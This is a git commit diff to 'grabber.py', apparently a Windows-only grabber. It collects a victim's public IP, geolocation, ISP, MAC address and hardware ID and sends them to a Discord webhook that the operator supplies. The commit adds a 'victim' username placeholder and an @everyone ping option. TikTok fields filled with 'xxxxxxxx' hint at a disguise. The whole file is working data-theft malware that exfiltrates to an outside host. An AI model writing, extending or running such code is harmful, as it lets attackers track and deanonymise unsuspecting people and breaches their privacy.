4891b9b0e09aa85188be80a180da87c87f36fb1a
Tekky <98614666+xtekky@users.noreply.github.com>
2022-05-03 22:37:34 +0200

    Update grabber.py

--- grabber.py
+++ grabber.py
@@ -6,10 +6,11 @@ from datetime import datetime
 if os.name != "nt":
     sys.exit()
 
-#username = input('Enter Discord username > ')
-
+username = "ENTER_VICTIM_DISCORD_USERNAME"
 
 webh = "ENTER_WEBHOOK_HERE"
+
+ping = True #set to false if you don't want a ping
 
 try:
     request = requests.get('https://google.com', timeout=5)
@@ -26,11 +27,16 @@ ip = requests.get('https://api.ipify.org/').text
 e = requests.get(f"http://ip-api.com/json/{ip}").json()
 x = "xxxxxxxx"
 
+content = ''
+
+if ping == True:
+    content = "everyone"
+    
 embed = {
-      "content": "None",
+      "content": content,
       "embeds": [
         {
-          "title": "{} | IP:",
+          "title": "{username} | IP:",
           "description": f"**Location**\n```python\nCountry: {e['country']} |  Region: {e['regionName']} | City: {e['city']} | Lat: {e['lat']} | Lon: {e['lon']} \nISP: {e['isp']}\nORG: {e['org']}\nAS: {e['as']}\nMAC: {mac}\nHWID: {hwid}\n```\n**Info**\n```python\nTikTok Id: {x} | User: {x}\nLikes: {x}| Views: {x}| Shares: {x}\n```\n**Time Started:** \n```python\n{datetime.now().strftime('%H:%M:%S')}\n```",
           "color": 5814783,
           "footer": {
